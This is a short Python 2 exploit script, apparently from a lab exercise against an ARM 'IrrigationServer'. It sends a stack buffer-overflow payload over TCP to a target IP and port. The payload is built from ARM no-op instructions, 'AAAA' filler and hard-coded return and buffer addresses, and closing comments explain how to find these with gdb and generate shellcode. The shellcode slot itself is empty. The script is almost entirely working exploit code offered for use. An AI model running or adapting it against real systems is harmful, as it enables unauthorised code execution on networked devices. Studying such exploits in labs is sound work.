#!/usr/bin/python

import sys, socket


# NoP + shellcode + "AAAA" + return address in main function (address after the calling function)
# + NoP + "AAAA" + buffer address  

shellcode = ("\x01\x10\xa0\xe1"*10
+ ""
+ "AAAA" + "\xd4\x2d\x01\x01"        # return address using gdb (added by 0x01000000); when return address changes, need to change shellcode (address of code modification)
+ "\x01\x10\xa0\xe1"*43
+ "AAAA"+"\x54\xf0\xff\x7e")         # buffer address




if __name__ == "__main__":
    if len(sys.argv) != 3:
        print "./injecting_code.py  192.168.1.26  5555"
    else:
        sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM,0)
        sock.connect(( sys.argv[1], int(sys.argv[2]) ))
        sock.send(shellcode)
        sock.close()

        print "InjectingCode: Shellcode Length: %d" %len(shellcode)




# $gdb IrrigationServer
# gef> disass vulnerable
# Find return address and set the address
# Change the code modification address into the step3.s file and generate shellcode




